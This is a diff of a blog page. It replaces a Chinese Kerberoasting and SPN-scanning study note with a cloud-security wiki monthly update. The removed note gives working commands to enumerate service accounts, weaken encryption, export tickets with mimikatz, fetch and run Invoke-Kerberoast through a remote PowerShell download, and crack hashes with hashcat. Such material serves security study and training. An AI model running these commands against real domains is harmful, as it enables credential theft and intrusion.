@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【内网学习笔记】24、SPN 的应用, TeamsSix">
+    <meta name="keywords" content="T Wiki 云安全知识库 5 月份更新汇总, TeamsSix">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -29,7 +29,7 @@
 </script>
 
 
-    <title>【内网学习笔记】24、SPN 的应用 | TeamsSix</title>
+    <title>T Wiki 云安全知识库 5 月份更新汇总 | TeamsSix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -271,12 +271,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113159.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202205311237409.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【内网学习笔记】24、SPN 的应用</h1>
+                    <h1 class="description center-align post-title">T Wiki 云安全知识库 5 月份更新汇总</h1>
                 </div>
             </div>
         </div>
@@ -392,16 +392,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%BA%A2%E9%98%9F/">
-                                <span class="chip bg-color">红队</span>
+                            <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">云安全</span>
                             </a>
                         
-                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                                <span class="chip bg-color">学习笔记</span>
+                            <a href="/tags/%E7%9F%A5%E8%AF%86%E6%96%87%E5%BA%93/">
+                                <span class="chip bg-color">知识文库</span>
                             </a>
                         
-                            <a href="/tags/%E5%86%85%E7%BD%91/">
-                                <span class="chip bg-color">内网</span>
+                            <a href="/tags/%E6%9B%B4%E6%96%B0%E6%B1%87%E6%80%BB/">
+                                <span class="chip bg-color">更新汇总</span>
                             </a>
                         
                     </div>
@@ -412,8 +412,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                内网学习笔记
+                            <a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/" class="post-category">
+                                云安全
                             </a>
                         
                     </div>
@@ -425,28 +425,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-07
+                    2022-05-31
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-22
+                    2022-05-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4k
+                    590
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    15 分
+                    2 分
                 </div>
                 
 
@@ -469,236 +469,69 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>Windows 域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组和集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。</p>
-<p>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主题名称即 SPN (Service Principal Name）</p>
-<h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos 是由 MIT 提出的一种网络身份验证协议，旨在通过密钥加密技术为客户端/服务器应用程序提供强身份验证，它也是主要用在域环境下的身份认证协议。</p>
-<p>在 Kerberos 认证中，最主要的问题就是如何证明「你是你」的问题，比如当一个用户去访问服务器上的某服务时，服务器如何判断该用户是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不会影响通讯的安全性，这正是 Kerberos 解决的问题。</p>
-<p>Kerberos 协议中的名称解释：</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>T Wiki 在 4 月 16 日上线，5 月份以来依然收到不少师傅的支持与反馈，此时正好到月末，特此整理下这段时间来 T Wiki 上所更新的内容，如果你还不知道 T Wiki 是什么，可以查看这篇文章<a target="_blank" rel="noopener" href="https://teamssix.com/220415-210629.html">T Wiki 云安全知识文库上线</a>，或者访问 T Wiki 地址： <a target="_blank" rel="noopener" href="https://wiki.teamssix.com/Changelog/">wiki.teamssix.com</a></p>
+<h2 id="感谢你们"><a href="#感谢你们" class="headerlink" title="感谢你们"></a>感谢你们</h2><p>自 5 月 1 日至 5 月 31 日，T Wiki 总共收到了 4 位师傅的补充，分别为 m4d3bug、Idle Life、da Vinci【达文西】、tanger</p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202205311237409.png"></p>
+<h3 id="云安全资源板块补充内容"><a href="#云安全资源板块补充内容" class="headerlink" title="云安全资源板块补充内容"></a>云安全资源板块补充内容</h3><p><strong>m4d3bug</strong></p>
 <ul>
-<li>Client: 访问服务的客户端</li>
-<li>Server: 提供服务的服务器</li>
-<li>KDC (Key Distribution Center): 密钥分发中心</li>
-<li>AS (Authentication Service): 认证服务器</li>
-<li>TGS (Ticket Granting Service): 票据授予服务</li>
-<li>DC (Domain Controller): 域控制器</li>
-<li>AD (Account Database): 用户数据库</li>
-<li>TGT (Ticket Granting Ticket): 票证授予票证</li>
-<li>ST (Servre Ticket): 服务票据</li>
+<li>k8s 安全风险检测工具 StackRox</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906154732.png"></p>
-<p>根据上图，这里一步一步进行解释</p>
-<p><strong>第一阶段：Clinet 与 AS</strong></p>
-<p>① 客户端向认证服务器 AS 发起请求，请求内容为自己的用户名、主机 IP 和当前时间戳。</p>
-<p>② AS 接收到请求，此时 AS 会根据用户名在用户数据库 AD 中寻找，判断这个用户名在不在白名单里，此时只会查找具有相同用户名的用户，并不会判断身份的可靠性；如果没有该用户名，认证失败；如果存在该用户名，则 AS 便认为用户存在，此时 AS 对客户端做出响应，响应内容包含两部分：</p>
+<p><strong>Idle Life</strong></p>
 <ul>
-<li>第一部分：票据授予票据 TGT，客户端需要使用 TGT 去密钥分发中心 KDC 中的票据授予服务 TGS 获取访问网络服务所需的票据，TGT 中包含的内容有 kerberos 数据库中存在的客户端信息、IP、当前时间戳 </li>
-<li>第二部分：使用客户端密钥加密的一段内容，这段内容包括：用于客户端和 TGS 之间通信的 Session_Key (CT_SK) ，客户端即将访问的 TGS 信息以及 TGT 的有效时间和一个当前时间戳，该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。</li>
+<li>开源云原生安全防护平台 neuvector</li>
 </ul>
-<p>至此，第一阶段通信完成。</p>
-<p><strong>第二阶段：Clinet 与 TGS</strong></p>
-<p>此时客户端已经获取到了 AS 返回的消息，客户端会将 AS 返回的第二部分内容进行解密，分别获得时间戳、接下来要访问的 TGS 信息以及用于和 TGS 通信的密钥 CT_SK</p>
-<p>首先客户端会判断时间戳与自己发出的时间差是否大于 5 分钟，如果大于 5 分钟那就认为这个 AS 是伪造的，认证失败，否则就继续准备向 TGS 发起请求。</p>
-<p>③ 客户端向 TGS 发起请求，请求的内容包含三部分：</p>
+<p><strong>da Vinci【达文西】</strong></p>
 <ul>
-<li>第一部分：使用 CT_SK 加密的客户端信息、IP、时间戳</li>
-<li>第二部分：自己想要访问的 Server 服务信息（明文形式）</li>
-<li>第三部分：使用 TGS 密钥加密的 TGT</li>
+<li>云安全态势管理工具 CloudSploit</li>
+<li>Azure 红队利用工具 Stormspotter</li>
+<li>GCP IAM 权限提升方法 GCP-IAM-Privilege-Escalation</li>
 </ul>
-<p>④ TGS 接收到请求，首先判断当前系统是否存在客户端想要访问的 Server 服务，如果不存在，认证失败，如果存在则继续接下来的认证。</p>
-<p>​    接下来 TGS 利用自己的秘钥解密 TGT 内容，此时 TGS 获取到经过 AS 认证后的用户信息、CT_SK、时间戳信息，通过时间戳判断此次请求时延是否正常，如果时延正常就继续下一步。</p>
-<p>​    之后 TGS 会使用 CT_SK 解密客户端发来的第一部分内容，取出其中的用户信息和 TGT 里的用户信息进行对比，如果全部一致则认为客户端身份正常，继续下一步。</p>
-<p>​    此时 TGS 将向客户端发起响应，响应信息包含两部分：</p>
+<p><strong>tanger</strong></p>
 <ul>
-<li>第一部分：使用服务端密码加密的服务票据 ST，其中包括客户端信息、IP、客户端待访问的服务端信息、ST 有效信息、时间戳以及用于客户端和服务端之间通信的 CS_SK</li>
-<li>第二部分：使用 CT_SK 加密的内容，其中包括 CS_SK 、时间戳和 ST 的有效时间。</li>
+<li>腾讯云轻量服务器管理工具</li>
 </ul>
-<p>至此，第二阶段通信完成。</p>
-<p><strong>第三阶段：Clinet 与 Server</strong></p>
-<p>此时客户端收到来自 TGS 的响应，并使用本地缓存的 CT_SK 解密出 TGS 返回的第二部分内容，检查时间戳无误后，取出 CS_SK 准备向服务端发起请求。这里由于 TGS 返回的第一部分信息是用的服务端秘钥加密的，因此这里的客户端是无法进行解密的。</p>
-<p>⑤ 客户端向服务端发送请求，请求内容包括两部分：</p>
+<p><strong>TeamsSix</strong></p>
 <ul>
-<li>第一部分：利用 CS_SK 将自己的主机信息和时间戳进行加密的信息</li>
-<li>第二部分：第 ④ 步里 TGS 向客户端返回的第一部分内容，即使用服务端密码加密的服务票据 ST</li>
+<li>云服务安全漏洞汇总</li>
+<li>基于终端 UI 的 k8s 集群管理工具 k9s</li>
+<li>从零开始的 Kubernetes 攻防</li>
+<li>初探 eBPF</li>
+<li>KubeCon + CloudNativeCon Europe 2022 相关视频</li>
+<li>CNCF 云原生安全白皮书 v2</li>
+<li>云上攻防：RED TEAMING FOR CLOUD</li>
+<li>云上攻防二三事（续）</li>
+<li>AWS 控制台接管利用工具 aws_consoler</li>
+<li>云上公开资产枚举 CloudBrute</li>
+<li>k8s 调试辅助工具 validkube</li>
+<li>Bridgecrew Blog（英文）</li>
+<li>浅析K8S各种未授权攻击方法</li>
+<li>Trend Micro Blog（英文）</li>
+<li>企业迁移到公有云之前要问的5个问题</li>
+<li>在 AWS 下查看自己所拥有的权限</li>
+<li>APISIX CVE-2022-29266 漏洞分析与复现</li>
+<li>保障云和容器安全的十个注意事项（英文）</li>
+<li>Rhino Security Labs Blog（英文）</li>
+<li>火线云安全知识库</li>
+<li>多云靶场搭建工具 TerraformGoat</li>
+<li>Cloud Security Wiki（英文）</li>
+<li>火线云安全沙龙视频</li>
+<li>《Hacking Kubernetes》</li>
 </ul>
-<p>⑥ 服务端此时收到了来自客户端的请求，它会使用自己的密钥解密客户端发来的第二部分内容，核对时间戳之后，取出 CS_SK，利用 CS_SK 解密第一部分内容，从而获得经过 TGS 认证后的客户端信息。</p>
-<p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用 CS_SK 加密的表示接受的信息，客户端接受到信息后也确认了服务端的真实性。</p>
-<p>至此，第三阶段通信完成，到这里整个 kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p>
-<p>这里可以再通过时序图加深下印象。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906174237.jpg"></p>
-<p>注意点：</p>
-<ul>
-<li>KDC 服务默认会安装在一个域的域控中</li>
-<li>Kerberos 认证采用对称加密算法</li>
-<li>三个阶段里都使用了密钥，这些密钥都是临时生成的，也只在一次会话中生效，因此即使密钥被劫持，等到密钥被破解可能这次会话也都早已结束。</li>
-<li>AD 其实是一个类似于本机 SAM 的一个数据库，全称叫 Account Database，存储所有 Client 白名单，只有存在于白名单的 Client 才能顺利申请到 TGT</li>
-<li>KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为它就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li>
-</ul>
-<h2 id="1、SPN"><a href="#1、SPN" class="headerlink" title="1、SPN"></a>1、SPN</h2><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p>在使用 Kerberos 协议进行身份验证的网络中，必须在内置账号（NetworkService、LocalSystem）或者用户账号下为服务器注册 SPN。</p>
-<p>对于内置账号，SPN 将自动进行注册，如果在域用户账号下运行服务，则必须为要使用的账号手动注册 SPN。</p>
-<p>因为域环境中的每台服务器都需要在 Kerberos 身份验证服务中注册 SPN ，所以 RT 会直接向域控制器发送查询请求，获取需要的服务的 SPN ，从而知道自己需要使用的服务资源在哪台机器上。</p>
-<p>SPN 格式如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">serviceclass &quot;&#x2F;&quot; hostname [&quot;:&quot;port] [&quot;&#x2F;&quot; servicename]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<h3 id="文章更新内容"><a href="#文章更新内容" class="headerlink" title="文章更新内容"></a>文章更新内容</h3><p>《Terraform 使用入门以及在云上攻防中的作用》</p>
+<p>《S3 任意文件上传》</p>
+<p>《Bucket Object 遍历》</p>
+<p>《RDS 信息收集》</p>
+<p>《MSSQL 读取实例信息》</p>
+<p>《PostgreSQL 数据库 SSRF》</p>
+<p>《利用 IAM 进行权限提升》</p>
+<p>《利用 IAM 进行权限维持》</p>
+<p>《在 AWS 下查看自己所拥有的权限》</p>
+<h2 id="Awesome-Cloud-Security"><a href="#Awesome-Cloud-Security" class="headerlink" title="Awesome Cloud Security"></a>Awesome Cloud Security</h2><p>Awesome Cloud Security 项目是一个云安全资源汇总的项目，这个项目内容会和 T Wiki 云安全资源板块同步更新，Awesome Cloud Security 项目地址：<a target="_blank" rel="noopener" href="https://github.com/teamssix/awesome-cloud-security">github.com/teamssix/awesome-cloud-security</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202205311237341.png"></p>
 <blockquote>
-<p>serviceclass（必选）：服务组件名称</p>
-<p>hostname（必选）：以 “/” 与后面的名称分隔，这里的 hostname 是计算机的 FQDN (全限定域名，同时带有计算机名和域名)</p>
-<p>port（可选）：以冒号分隔，后面的内容为该服务监听的端口号</p>
-<p>servicename（可选）：一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或全限定域名</p>
+<p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p>
 </blockquote>
-<h3 id="常见-SPN-服务"><a href="#常见-SPN-服务" class="headerlink" title="常见 SPN 服务"></a>常见 SPN 服务</h3><p>MSSQL 服务</p>
-<pre class="line-numbers language-none"><code class="language-none">MSSQLSvc&#x2F;DBServer.teamssix.com:1433<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>Exchange 服务</p>
-<pre class="line-numbers language-none"><code class="language-none">exchangeMDB&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>RDP 服务</p>
-<pre class="line-numbers language-none"><code class="language-none">TERMSRV&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>WSMan/WinRM/PSRemoting 服务</p>
-<pre class="line-numbers language-none"><code class="language-none">WSMAN&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="SPN-扫描脚本"><a href="#SPN-扫描脚本" class="headerlink" title="SPN 扫描脚本"></a>SPN 扫描脚本</h3><p>SPN 扫描也叫「扫描 Kerberos 服务实例名称」，在活动目录中发现服务的最佳方法就是 SPN 扫描。</p>
-<p>SPN 扫描通过请求特定 SPN 类型的服务主体名称来查找服务，与网络端口相比，SPN 扫描的主要特点是不需要通过连接网络中的每个 IP 地址来检查服务端口，因此不会因触发内网中的安全设备规则而产生大量的告警日志。</p>
-<p>由于 SPN 查询是 Kerberos 票据行为的一部分，所以检测难度较大。</p>
-<h4 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h4><p>setspn 是 Windows 自带命令，以下命令可列出域中所有的 SPN 信息</p>
-<pre class="line-numbers language-none"><code class="language-none">setspn -T teamssix -Q *&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h4 id="Active-Directory-模块"><a href="#Active-Directory-模块" class="headerlink" title="Active Directory 模块"></a>Active Directory 模块</h4><p>PowerShell 模块 Active Directory 只在域控上有</p>
-<pre class="line-numbers language-none"><code class="language-none">Import-Module ActiveDirectory
-get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>或者使用大佬导出的模块，这样普通用户也可以使用该模块，下载地址：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
-<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Microsoft.ActiveDirectory.Management.dll
-get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>PowerView 下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
-<pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1
-Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,last<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h4 id="Powershell-AD-Recon"><a href="#Powershell-AD-Recon" class="headerlink" title="Powershell-AD-Recon"></a>Powershell-AD-Recon</h4><p>Powershell-AD-Recon 提供了一系列获取服务与服务登录账号和运行服务的主机之间的对应关系的工具，这些服务包括但不限于 MSSQL、Exchange、RDP、WinRM</p>
-<p>Powershell-AD-Recon 下载地址：<a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p>
-<p>Powershell-AD-Recon 工具包里的内容如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">Discover-PSInterestingServices	# 查找所有 SPN 服务
-Discover-PSMSExchangeServers		# 查找 Exchange 服务器
-Discover-PSMSSQLServers         # 查找 MSSQL 服务器
-Find-PSServiceAccounts          # 查找服务账户
-Get-DomainKerberosPolicy        # 获取域 Kerberos 策略
-Get-PSADForestInfo              # 获取域森林信息
-Get-PSADForestqInfo             # 获取域森林 KRBTGT 信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<blockquote>
-<p>下载后的文件是没有 .ps1 后缀的，需要自己添加上</p>
-</blockquote>
-<p>由于 SPN 是通过 LDAP 协议向域控制器进行查询的，因此 RT 需要获得一个普通的域用户权限才可以进行 SPN 扫描。</p>
-<p>将 PowerShell 脚本导入并执行，以 MSSQL 服务为例</p>
-<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSMSSQLServers.ps1
-Discover-PSMSSQLServers
-或者
-PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSMSSQLServers.ps1;Discover-PSMSSQLServers&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>扫描域中所有的 SPN 信息</p>
-<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSInterestingServices.ps1
-Discover-PSInterestingServices
-或者
-PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h4><p>kerberoast 工具包里的 GetUserSPNs.ps1，可以帮助我们发现仅与用户帐户相关联的服务。</p>
-<p>kerberoast 下载地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
-<pre class="line-numbers language-none"><code class="language-none">.&#x2F;GetUserSPNs.ps1
-或者
-PowerShell -Exec bypass -File GetUserSPNs.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>kerberoast 工具包里的 GetUserSPNs.vbs 也能实现相同的功能</p>
-<pre class="line-numbers language-none"><code class="language-none">cscript.exe GetUserSPNs.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h4 id="PowerShellery"><a href="#PowerShellery" class="headerlink" title="PowerShellery"></a>PowerShellery</h4><p>PowerShellery 工具包里包含了 Get-SPN，可以为各种服务收集 SPN</p>
-<p>PowerShellery 下载地址：<a target="_blank" rel="noopener" href="https://github.com/nullbind/Powershellery">https://github.com/nullbind/Powershellery</a></p>
-<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1
-Get-SPN -type service -search *
-或者
-PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search *&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>结果也可以转换为表格的形式，以便于浏览</p>
-<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1
-Get-SPN -type service -search * -List yes
-或者
-PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search * -List yes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>另外一个 Get-DomainSpn.psm1 脚本可以用来获取 UserSID、服务和实际用户</p>
-<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-DomainSpn.psm1
-Get-DomainSpn
-或者
-PowerShell -Exec bypass -C &quot;Import-Module .\Get-DomainSpn.psm1;Get-DomainSpn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>Impacket 下载地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
-<p>上面的工具都是在域内的机器里扫描 SPN 的，利用 impacket 工具包下的 GetUserSPNs.py 可以在非域主机中扫描目标的 SPN</p>
-<pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906144640.png"></p>
-<h2 id="2、kerberoast"><a href="#2、kerberoast" class="headerlink" title="2、kerberoast"></a>2、kerberoast</h2><p>kerberoast 是一种针对 Kerberos 协议的利用方式，在因为需要使用某个特定资源而向 TGS 发送 Kerberos 服务票据的请求时，用户首先需要使用具有有效身份权限的 TGT 向 TGS 请求相应服务的票据。</p>
-<p>当 TGT 被验证有效且具有该服务的权限时，TGS 会向用户发送一张票据。该票据使用与 SPN 相关联的计算机服务账号的 NTLM Hash（RC4_HMAC_MD5），就是说，RT 会通过 Kerberoast 尝试使用不同的 NTLM Hash 来打开该 Kerberos 票据，如果 RT 使用的 NTLM Hash 是正确的，Kerberos 票据就会被打开，而该 NTLM Hash 对应于该计算机服务账号的密码。</p>
-<p>kerberoast 的利用思路：</p>
-<p>1、查询 SPN 寻找在 Users 下并且是高权限域用户的服务</p>
-<p>2、请求并导出 TGS</p>
-<p>3、对 TGS 进行爆破</p>
-<p>这里以 MSSQL 服务为例，并尝试破解该服务的票据</p>
-<p>手动注册 SPN</p>
-<pre class="line-numbers language-none"><code class="language-none">setspn -A MSSQLSvc&#x2F;DBSRV.teamssix.com:1433 test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>查看用户所对应的 SPN</p>
-<pre class="line-numbers language-none"><code class="language-none">setspn -L teamssix.com\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>也可以使用 adsiedit.msc 查看用户 SPN 及其他高级属性</p>
-<p>为用户配置指定服务的登录权限，gpedit.msc 打开本地组策略编辑器，找到以下路径，将用户添加进去，例如这里添加的用户为 test</p>
-<pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\用户权限分配\作为服务登录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>因为 Kerberos 协议的默认加密方式是 AES256_HMAC，而通过 tgsreperack.py 脚本无法破解该加密方式，因此我们可以通过组策略将加密方式设置为 RC_HMAC_MD5</p>
-<p>在本地组策略编辑器中，找到以下路径，将加密方式设置为 RC_HMAC_MD5</p>
-<pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\安全选项\网络安全：配置 Kerberos 允许的加密类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>请求指定 SPN 的服务票据</p>
-<pre class="line-numbers language-none"><code class="language-none">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DBSRV.teamssix.com&#39;
-Add-Type -AssemblyNAme System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>或者请求所有服务的服务票据</p>
-<pre class="line-numbers language-none"><code class="language-none">Add-Type -AssemblyName System.IdentityModel  
-setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>可以使用 klist 查看本地缓存的票证，看看有没有新的票据</p>
-<p>之后在 mimikatz 中执行如下命令，将内存中的票据导出</p>
-<pre class="line-numbers language-none"><code class="language-none">kerberos::list &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>也可以不使用 mimikatz，使用 powershell 脚本导出支持 hashcat 破解的格式</p>
-<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;EmpireProject&#x2F;Empire&#x2F;6ee7e036607a62b0192daed46d3711afc65c3921&#x2F;data&#x2F;module_source&#x2F;credentials&#x2F;Invoke-Kerberoast.ps1&#39;);Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>或者使用 Rubeus 获取票据</p>
-<pre class="line-numbers language-none"><code class="language-none">Rubeus.exe kerberoast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>也可以使用 impacket 获取票据</p>
-<pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -request -dc-ip 192.168.7.7 -debug teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113159.png"></p>
-<p>将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 tgsreperack.py 脚本破解票据的 NTLM Hash</p>
-<p>Kerberoast 脚本下载地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
-<pre class="line-numbers language-none"><code class="language-none">python tgsrepcrack.py password.txt mssql.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>或者使用 hashcat 破解 powershell 脚本、Rubeus、impacket 获取到的服务票据</p>
-<pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113300.png"></p>
-<blockquote>
-<p>参考文章：</p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/23a4e8978a30">https://www.jianshu.com/p/23a4e8978a30</a></p>
-<p><a target="_blank" rel="noopener" href="https://y4er.com/post/kerberos-kerberoasting-spn">https://y4er.com/post/kerberos-kerberoasting-spn</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/280406.html">https://www.freebuf.com/articles/web/280406.html</a></p>
